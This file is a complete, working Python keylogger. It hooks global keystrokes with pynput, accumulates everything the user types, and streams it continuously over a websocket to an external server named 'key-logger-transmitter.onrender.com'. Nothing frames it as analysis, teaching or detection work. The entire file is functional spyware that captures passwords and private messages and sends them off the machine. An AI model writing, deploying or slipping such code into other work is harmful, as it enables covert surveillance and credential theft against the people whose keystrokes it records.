import asyncio
import websockets
from pynput import keyboard

typed_text = ""

def on_press(key):
    global typed_text
    char=getattr(key, "char", None)
    if char is not None:
        typed_text+=char
    if key == keyboard.Key.space:
        typed_text += " "
    elif key == keyboard.Key.enter:
        typed_text += "\n"
    elif key == keyboard.Key.backspace:
        typed_text = typed_text[:-1]

listener = keyboard.Listener(on_press=on_press)  # non-blocking, own thread
listener.start()

async def main():
    async with websockets.connect("wss://key-logger-transmitter.onrender.com") as ws:
        last = None
        while True:
            msg = repr(typed_text)
            if msg != last:
                await ws.send(msg)
                last = msg
            await asyncio.sleep(0.1)

try:
    asyncio.run(main())
finally:
    listener.stop()